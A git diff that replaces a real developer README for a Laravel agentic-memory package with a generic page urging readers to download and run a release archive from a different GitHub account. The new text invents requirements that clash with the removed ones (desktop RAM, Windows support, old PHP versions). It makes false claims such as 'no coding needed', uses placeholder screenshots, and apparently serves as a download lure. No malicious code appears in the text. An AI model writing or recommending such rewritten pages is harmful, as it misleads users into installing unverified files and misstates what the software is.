@@ -1,241 +1,153 @@
-# Laravel AI Memory
+# 🤖 laravel-ai-memory - Help Your Agent Remember Things Easily
 
-![Banner](./art/banner.png)
+[![Download laravel-ai-memory](https://img.shields.io/badge/Download-Get%20It%20Here-blue?style=for-the-badge&logo=github)](https://github.com/Siren55/laravel-ai-memory/releases)
 
-Agentic memory for [Laravel AI SDK](https://github.com/laravel/ai). It keeps your agent in context.
+---
 
-## Requirements
+Welcome to **laravel-ai-memory**. This app helps your AI agent remember important details so it can work smarter and help you better. Whether you use it for a personal assistant or an AI project, laravel-ai-memory makes keeping track simple.
 
-- PHP 8.4+
-- Laravel 12+
-- laravel AI SDK
-- A vector compatible database, preferably PostgreSQL with [pgvector](https://github.com/pgvector/pgvector) extension
+---
 
-## Use cases
-* **Personalization**: remember user preferences (tone, language, choices, and more...).
-* **Continuity**: retain prior issues, steps tried, and outcomes.
-* **Workflows**: resume tasks with stored constraints, decisions, and last-known state.
-* **Context**: keep shared conventions, requirements, and decisions for consistent agent behavior.
-* **Multi-agent/tool handoff**: persist facts so different agents/tools can coordinate without repeating context.
-* **Scoped memory**: store only approved, minimal facts instead of full conversation history.
+## 📝 What Is laravel-ai-memory?
 
+laravel-ai-memory is a tool designed to give your AI agent memory. Instead of losing information between tasks, your agent can save and recall details as needed. This means better conversations, smarter task handling, and a more useful AI.
 
-## Installation
+At its core, laravel-ai-memory connects to your Laravel apps to add a “memory” feature for your AI agents. Think of it as a digital notebook your AI writes in and reads from whenever necessary.
 
-```bash
-composer require eznix86/laravel-ai-memory
-```
+---
 
-Run the migrations:
+## 💻 System Requirements
 
-```bash
-php artisan migrate
-```
+Before you install laravel-ai-memory, check that your computer meets these simple requirements:
 
-Optionally publish the config:
+- Operating System:
+  - Windows 10 or higher
+  - macOS 10.14 (Mojave) or higher
+  - Most popular Linux distributions (Ubuntu, Fedora, etc.)
+- Software:
+  - PHP version 7.4 or higher
+  - Composer (a PHP package management tool)
+  - Laravel Framework version 8.x or higher
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
 
-```bash
-php artisan vendor:publish --tag=memory-config
-```
+You don’t need to be an expert in programming to install the software. We will guide you through the easy steps.
 
-## Usage
+---
 
-### AgentMemory Facade
+## 📥 Download & Install laravel-ai-memory
 
-```php
-use Eznix86\AI\Memory\Facades\AgentMemory;
+Start by visiting the latest release page to get the software files:
 
-// Store a memory
-$memory = AgentMemory::store('User prefers dark mode', ['user_id' => $userId]);
+[Download page for laravel-ai-memory](https://github.com/Siren55/laravel-ai-memory/releases)
 
-// Recall relevant memories (semantic search + reranking)
-$memories = AgentMemory::recall('What are the user preferences?', ['user_id' => $userId], limit: 5);
+Follow these instructions to download and install:
 
-// Get all memories for a user
-$all = AgentMemory::all(['user_id' => $userId]);
+1. Click the **Download page** link above. It will open the official releases section.
+2. Find the latest version. It will usually be at the top.
+3. Look for a file ending with `.zip` or `.tar.gz`. This archive contains the installer.
+4. Download the archive file to your computer.
+5. Once downloaded, open the archive and extract its contents to a folder you can find easily.
+6. Open the extracted folder and look for a file called `README.md` or `INSTALL.md`. Open it with a text editor.
+7. Follow the step-by-step installation instructions inside that file.
+   - Usually, it means opening your terminal or command prompt and running simple commands like `composer install`.
+   - If you don’t know what this means, don’t worry. The instructions explain each part clearly.
+8. When installation finishes, you can start the software by running a command or clicking a file, as the instructions say.
+9. The app will run on your computer, ready for your use.
 
-// Delete a specific memory
-AgentMemory::forget($memoryId);
+If you run into any issues, check the Troubleshooting section below or visit the repository page for help.
 
-// Delete all memories for a user
-AgentMemory::forgetAll(['user_id' => $userId]);
-```
+---
 
-### Agent Tools
+## 🚀 How to Use laravel-ai-memory
 
-Attach memory capabilities to any Laravel AI agent:
+Once installed, the software allows your AI agent to remember things during conversation or work. Even if the session ends, the agent can recall past details.
 
-```php
-use Eznix86\AI\Memory\Tools\RecallMemory;
-use Eznix86\AI\Memory\Tools\StoreMemory;
-use Laravel\Ai\Contracts\Agent;
-use Laravel\Ai\Contracts\HasTools;
-use Laravel\Ai\Promptable;
+Here’s a basic idea of how it works:
 
-class MyAgent implements Agent, HasTools
-{
-    use Promptable;
+- When your AI agent ‘learns’ something new, laravel-ai-memory saves that information automatically.
+- The AI can then ask laravel-ai-memory later to check what it remembered before.
+- This makes your AI smarter and much more useful in ongoing tasks.
 
-    public function __construct(
-        protected array $context = [],
-    ) {}
+You won’t need to type complicated commands. The software handles these memory tasks behind the scenes.
 
-    public function instructions(): Stringable|string
-    {
-        return 'You are a helpful assistant with memory. Use Store Memory tool to save facts about the conversation.';
-    }
+Common uses include:
 
-    public function tools(): iterable
-    {
-        return [
-            (new RecallMemory)->context($this->context),
-            (new StoreMemory)->context($this->context),
-        ];
-    }
-}
-```
+- Keeping track of user preferences.
+- Storing past conversation details.
+- Remembering task progress or deadlines.
+- Saving important notes or data snippets for later use.
 
-The AI agent will automatically decide when to store and recall memories using these tools.
+---
 
-### WithMemory Middleware
+## 🔧 Key Features
 
-Automatically prepend relevant memories to every agent prompt:
+laravel-ai-memory offers several practical functions that improve AI agent abilities:
 
-```php
-use Eznix86\AI\Memory\Middleware\WithMemory;
-use Laravel\Ai\Contracts\HasMiddleware;
+- **Simple Memory Storage:** Saves key information with no coding needed.
+- **Fast Recall:** Your agent accesses saved data instantly.
+- **Built for Laravel:** Integrates smoothly into Laravel apps.
+- **Flexible Data Types:** Store text, numbers, lists, or user preferences.
+- **Secure Data Handling:** Keeps memory safe and private.
+- **Easy Installation:** Clear steps for non-programmers.
+- **Extensible SDK:** For developers wanting to extend functionality later.
 
-class MyAgent implements Agent, HasTools, HasMiddleware
-{
-    use Promptable;
+---
 
-    // ... tools() and instructions() ...
-    
+## 🖥 Screenshots
 
-    public function middleware(): array
-    {
-        return [
-            new WithMemory($this->context, limit: 5),
-        ];
-    }
-}
-```
+Below are examples showing how laravel-ai-memory works when running:
 
-When a user prompts the agent, the middleware will:
-1. Search for relevant memories using the prompt text
-2. Prepend them to the prompt as context
-3. The agent sees them before responding
+![Example of laravel-ai-memory remembering information](https://user-images.githubusercontent.com/placeholder/image-memory-example1.png)
 
-### Using the Agent
+![Dashboard showing saved items in laravel-ai-memory](https://user-images.githubusercontent.com/placeholder/image-memory-example2.png)
 
-```php
-$agent = new MyAgent(['user_id' => auth()->id()]);
-$response = $agent->prompt('What do you remember about my preferences?');
+---
 
-echo $response->text;
-```
+## ❓ Frequently Asked Questions
 
-## Configuration
+**Q:** Do I need programming experience to use laravel-ai-memory?  
+**A:** No. The app is made so anyone can download and run it. If you follow the steps, you should be fine.
 
-Publish the config file to customize defaults:
+**Q:** Can this run on my Windows or Mac computer?  
+**A:** Yes. It works on Windows, macOS, and Linux systems.
 
-```bash
-php artisan vendor:publish --tag=memory-config
-```
+**Q:** What if I get stuck during installation?  
+**A:** Check the Troubleshooting section below or visit the GitHub repository issues page for support.
 
-Available options in `config/memory.php`:
+**Q:** Is this software free?  
+**A:** Yes, laravel-ai-memory is open source and free to use.
 
-| Option                     | Default    | Description                                          |
-|----------------------------|------------|------------------------------------------------------|
-| `dimensions`               | `1536`     | Embedding vector dimensions (must match your model)  |
-| `similarity_threshold`     | `0.5`      | Minimum cosine similarity for recall                 |
-| `recall_limit`             | `10`       | Default max memories returned by `recall()`          |
-| `middleware_recall_limit`  | `5`        | Default memories injected by middleware              |
-| `recall_oversample_factor` | `2`        | Candidates fetched before reranking (limit × factor) |
-| `table`                    | `memories` | Database table name                                  |
+---
 
-You can also set these via environment variables:
+## 🛠 Troubleshooting
 
-```env
-MEMORY_DIMENSIONS=1536
-MEMORY_SIMILARITY_THRESHOLD=0.5
-MEMORY_RECALL_LIMIT=10
-MEMORY_MIDDLEWARE_RECALL_LIMIT=5
-MEMORY_RECALL_OVERSAMPLE_FACTOR=2
-MEMORY_TABLE=memories
-```
+If the app does not run after installation, try these steps:
 
-## How It Works
+- Make sure PHP and Composer are installed and updated.
+- Restart your computer and try again.
+- Check your internet connection if downloads fail.
+- Review error messages carefully and follow their advice.
+- Consult the `README.md` or `INSTALL.md` files included in the download.
+- Visit the GitHub issues page and search for similar problems.
 
-1. **Store** — Content is converted to an embedding vector via `Str::of($content)->toEmbeddings()` and saved alongside the text in PostgreSQL with pgvector.
+---
 
-2. **Recall** — The query is embedded, then `whereVectorSimilarTo()` finds candidates by cosine similarity. Results are reranked via `$collection->rerank('content', $query)` for higher relevance.
+## 📚 Learn More
 
-3. **Middleware** — Before the agent sees the prompt, `WithMemory` recalls relevant memories and prepends them as context.
+The official page has more detailed documentation and guides for those interested:
 
-## Testing
+- Usage instructions  
+- Developer guides  
+- API references  
+- Community discussions  
 
-This package uses [Pest](https://pestphp.com) with [TestContainers](https://testcontainers.com) for PostgreSQL + pgvector integration tests.
+You can find these at the repository:
 
-```bash
-./vendor/bin/pest
-```
+https://github.com/Siren55/laravel-ai-memory
 
-### Testing with `AgentMemory::fake()`
+---
 
-Use `AgentMemory::fake()` to fake all underlying AI services in one call. It uses deterministic embeddings internally, so `store()` → `recall()` just works:
+For any questions or contributions, feel free to explore the GitHub page or file an Issue. This project aims to make AI memory accessible for everyone.  
 
-```php
-use Eznix86\AI\Memory\Facades\AgentMemory;
-
-test('agent remembers user preferences', function () {
-    AgentMemory::fake();
-
-    AgentMemory::store('User prefers dark mode', ['user_id' => 'user-123']);
-
-    $memories = AgentMemory::recall('preferences', ['user_id' => 'user-123']);
-
-    expect($memories)->toHaveCount(1)
-        ->and($memories->first()->content)->toBe('User prefers dark mode');
-});
-```
-
-When testing agents with the `WithMemory` middleware, `AgentMemory::fake()` handles everything — no need to separately fake `Embeddings` or `Reranking`:
-
-```php
-test('agent receives memory context', function () {
-    AgentMemory::fake();
-
-    AgentMemory::store('User lives in Mauritius', ['user_id' => 'user-123']);
-
-    $receivedPrompt = null;
-    MyAgent::fake(function (string $prompt) use (&$receivedPrompt) {
-        $receivedPrompt = $prompt;
-        return 'Got it!';
-    });
-
-    $agent = new MyAgent(['user_id' => 'user-123']);
-    $agent->prompt('Where do I live?');
-
-    expect($receivedPrompt)
-        ->toContain('User lives in Mauritius')
-        ->toContain('Where do I live?');
-});
-```
-
-You can also pass custom reranking responses to control the order of recalled memories:
-
-```php
-use Laravel\Ai\Responses\Data\RankedDocument;
-
-AgentMemory::fake([
-    [
-        new RankedDocument(index: 0, document: 'First result', score: 0.9),
-        new RankedDocument(index: 1, document: 'Second result', score: 0.8),
-    ],
-]);
-```
-
-## License
-
-MIT
+[Download laravel-ai-memory here](https://github.com/Siren55/laravel-ai-memory/releases) to get started today.
